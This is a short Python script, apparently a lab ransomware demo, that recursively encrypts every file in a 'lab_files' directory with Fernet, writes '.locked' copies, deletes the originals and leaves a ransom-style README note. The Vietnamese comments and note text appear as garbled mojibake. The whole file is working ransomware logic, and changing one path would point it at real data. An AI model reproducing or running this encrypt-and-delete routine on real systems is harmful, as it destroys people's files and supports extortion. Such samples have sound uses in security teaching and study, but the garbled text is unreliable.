import os
from cryptography.fernet import Fernet

# Th∆∞ m·ª•c ch·ª©a file s·∫Ω b·ªã m√£ h√≥a
TARGET_DIR = "lab_files"

# N·∫øu ch∆∞a c√≥ key th√¨ t·∫°o m·ªõi
def load_or_create_key():
    if not os.path.exists("secret.key"):
        key = Fernet.generate_key()
        with open("secret.key", "wb") as f:
            f.write(key)
    else:
        with open("secret.key", "rb") as f:
            key = f.read()
    return key

def encrypt_file(filepath, fernet):
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filepath + ".locked", "wb") as f:
        f.write(encrypted)
    os.remove(filepath)  # X√≥a file g·ªëc

def main():
    key = load_or_create_key()
    fernet = Fernet(key)

    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            filepath = os.path.join(root, file)
            if not file.endswith(".locked"):
                encrypt_file(filepath, fernet)

        # T·∫°o note ƒë√≤i chu·ªôc (ghi UTF-8 ƒë·ªÉ kh√¥ng b·ªã l·ªói emoji)
    with open(os.path.join(TARGET_DIR, "README_RESTORE.txt"), "w", encoding="utf-8") as f:
        f.write("üíÄ T·∫•t c·∫£ file c·ªßa b·∫°n ƒë√£ b·ªã m√£ h√≥a!\n")
        f.write("ƒê·ªÉ kh√¥i ph·ª•c, ch·∫°y script decrypt.py c√πng v·ªõi secret.key\n")

if __name__ == "__main__":
    main()
